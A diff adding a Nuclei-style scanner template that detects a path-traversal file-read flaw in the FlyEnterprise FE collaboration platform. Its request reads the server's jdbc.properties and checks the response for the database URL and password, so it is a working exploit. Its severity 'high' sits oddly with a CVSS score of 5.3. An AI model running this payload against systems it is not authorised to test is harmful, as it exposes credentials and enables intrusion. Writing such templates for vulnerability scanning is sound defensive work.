@@ -1,0 +1,31 @@
+id: flyrise-fe-file-read
+info:
+  name: FlyEnterprise Internet FE Business Collaboration Platform File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    FE office collaboration platform is an information management platform for application development, operation, management and maintenance. There is a file reading vulnerability in the FlyEnterprise Internet FE business collaboration platform, through which attackers can read important system files (such as database configuration files, system configuration files), resulting in a highly insecure state.
+  reference:
+    - https://www.flyrise.cn
+  tags: file-read
+  classification:
+    cvss-score: 5.3
+
+variables:
+  filename: "../web/fe.war/WEB-INF/classes/jdbc.properties"
+
+http:
+  - raw:
+      - |
+        GET /servlet/ShowImageServlet?imagePath={{filename}}&print HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "jdbc.driver"
+          - "jdbc.url"
+          - "jdbc.password"
